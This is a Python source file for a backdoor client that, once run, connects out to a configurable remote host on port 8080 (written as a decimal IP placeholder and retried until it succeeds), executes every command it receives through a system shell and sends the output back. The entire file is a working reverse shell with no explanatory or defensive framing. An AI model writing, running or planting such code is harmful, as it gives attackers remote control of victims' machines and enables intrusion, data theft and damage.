import socket
import subprocess
from datetime import datetime

OK = '+'
ERROR = '~'

DECIMAL = YOUR_DECIMAL_IP_ADDR
HOST = ".".join(map(str, [(DECIMAL >> 24) & 0xFF, (DECIMAL >> 16) & 0xFF, (DECIMAL >> 8) & 0xFF, DECIMAL & 0xFF]))
LOCALHOST = "127.0.0.1"
PORT = 8080
CONNECT_TIMEOUT = 10


class BackdoorClient:
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(CONNECT_TIMEOUT)
        self.connected = False

    def connect_to_server(self):
        while not self.connected:
            try:
                self.s.connect((HOST, PORT))
                self.connected = True
                print(f"[{OK}] [{datetime.now()}] Connected to {HOST}:{PORT}...")

            except:
                try:
                    self.s.connect((LOCALHOST, PORT))
                    self.connected = True
                    print(f"[{OK}] [{datetime.now()}] Connected to {LOCALHOST}:{PORT}...")

                except:
                    print(f"[{ERROR}] [{datetime.now()}] Failed to connect. Retrying...")

        self.s.settimeout(None)

    def receive_execute_send_loop(self):
        while True:
            try:
                received = self.s.recv(1024).decode()

                if received.lower() == 'exit':
                    break

                try:
                    result = subprocess.run(
                        received, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
                    )
                    exec_result = result.stdout.decode() if result.stdout else result.stderr.decode()

                except subprocess.CalledProcessError as ex:
                    exec_result = (
                        f"[{ERROR}] [{datetime.now()}] An unhandled error occurred: {ex.returncode=} - {ex.stderr.decode()}"
                    )

                self.s.send(exec_result.encode())

            except ConnectionResetError:
                print("Connection closed by the server.")
                break

            except (ConnectionAbortedError, ConnectionRefusedError):
                print("Connection aborted or refused. Exiting...")
                break

    def close_connection(self):
        self.s.close()


def main():
    backdoor_client = BackdoorClient()
    backdoor_client.connect_to_server()
    backdoor_client.receive_execute_send_loop()


if __name__ == "__main__":
    main()
